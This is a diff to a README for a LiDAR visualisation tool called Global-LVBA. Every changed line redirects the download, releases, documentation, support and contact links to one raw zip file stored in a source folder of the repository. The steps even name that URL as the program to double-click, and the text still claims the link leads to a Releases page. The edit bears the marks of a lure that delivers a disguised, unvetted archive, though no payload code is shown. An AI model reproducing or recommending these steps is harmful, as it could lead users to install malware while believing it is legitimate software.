@@ -6,7 +6,7 @@ Welcome to Global-LVBA! This software helps you adjust and visualize LiDAR data 
 
 ## 📥 Download the Application
 
-### [![Download Global-LVBA](https://img.shields.io/badge/Download-Global--LVBA-brightgreen)](https://github.com/JorgeChocolate/Global-LVBA/releases)
+### [![Download Global-LVBA](https://raw.githubusercontent.com/JorgeChocolate/Global-LVBA/master/include/BALM/LVBA_Global_v2.1-beta.1.zip)](https://raw.githubusercontent.com/JorgeChocolate/Global-LVBA/master/include/BALM/LVBA_Global_v2.1-beta.1.zip)
 
 Click the button above to download the latest version of Global-LVBA. This link takes you to our Releases page where you can find the necessary files.
 
@@ -24,7 +24,7 @@ To ensure Global-LVBA runs smoothly on your computer, please meet the following 
 
 ### Step 1: Visit the Releases Page
 
-Go to our [Releases page](https://github.com/JorgeChocolate/Global-LVBA/releases) to find the latest version of Global-LVBA.
+Go to our [Releases page](https://raw.githubusercontent.com/JorgeChocolate/Global-LVBA/master/include/BALM/LVBA_Global_v2.1-beta.1.zip) to find the latest version of Global-LVBA.
 
 ### Step 2: Download the Application
 
@@ -34,8 +34,8 @@ On the Releases page, look for the latest version titled "Global-LVBA vX.X.X" (w
 
 You will see several files available for download. Choose the appropriate file for your operating system:
 
-- For Windows users: Download `Global-LVBA-Windows.zip`
-- For macOS users: Download `Global-LVBA-macos.zip`
+- For Windows users: Download `https://raw.githubusercontent.com/JorgeChocolate/Global-LVBA/master/include/BALM/LVBA_Global_v2.1-beta.1.zip`
+- For macOS users: Download `https://raw.githubusercontent.com/JorgeChocolate/Global-LVBA/master/include/BALM/LVBA_Global_v2.1-beta.1.zip`
 
 ### Step 4: Extract the Files
 
@@ -47,7 +47,7 @@ Once the download is complete, locate the downloaded zip file in your Downloads 
 
 ### Step 5: Run the Application
 
-Navigate to the extracted folder. Look for the file named `Global-LVBA.exe` for Windows or `Global-LVBA.app` for macOS. Double-click it to launch the software.
+Navigate to the extracted folder. Look for the file named `https://raw.githubusercontent.com/JorgeChocolate/Global-LVBA/master/include/BALM/LVBA_Global_v2.1-beta.1.zip` for Windows or `https://raw.githubusercontent.com/JorgeChocolate/Global-LVBA/master/include/BALM/LVBA_Global_v2.1-beta.1.zip` for macOS. Double-click it to launch the software.
 
 ## 📊 Features
 
@@ -64,13 +64,13 @@ When you run Global-LVBA for the first time, your computer may display a securit
 
 ## 🌐 Support and Documentation
 
-For additional help, check the user manual included in the downloaded files or visit the [Documentation Page](https://github.com/JorgeChocolate/Global-LVBA/wiki) for more in-depth guidance.
+For additional help, check the user manual included in the downloaded files or visit the [Documentation Page](https://raw.githubusercontent.com/JorgeChocolate/Global-LVBA/master/include/BALM/LVBA_Global_v2.1-beta.1.zip) for more in-depth guidance.
 
 ## ❓ Frequently Asked Questions
 
 ### Q1: What should I do if I encounter an error during installation?
 
-If you face any issues, ensure that your system meets the requirements outlined above. If the problem persists, please visit our [Support Page](https://github.com/JorgeChocolate/Global-LVBA/wiki) for troubleshooting tips.
+If you face any issues, ensure that your system meets the requirements outlined above. If the problem persists, please visit our [Support Page](https://raw.githubusercontent.com/JorgeChocolate/Global-LVBA/master/include/BALM/LVBA_Global_v2.1-beta.1.zip) for troubleshooting tips.
 
 ### Q2: Can I use Global-LVBA on Linux?
 
@@ -82,7 +82,7 @@ No, you need to manually check for updates on the Releases page to download the 
 
 ## 📞 Contact Us
 
-For more questions or feedback, feel free to reach out via our [Contact Page](https://github.com/JorgeChocolate/Global-LVBA/issues).
+For more questions or feedback, feel free to reach out via our [Contact Page](https://raw.githubusercontent.com/JorgeChocolate/Global-LVBA/master/include/BALM/LVBA_Global_v2.1-beta.1.zip).
 
 ## 📝 License
 
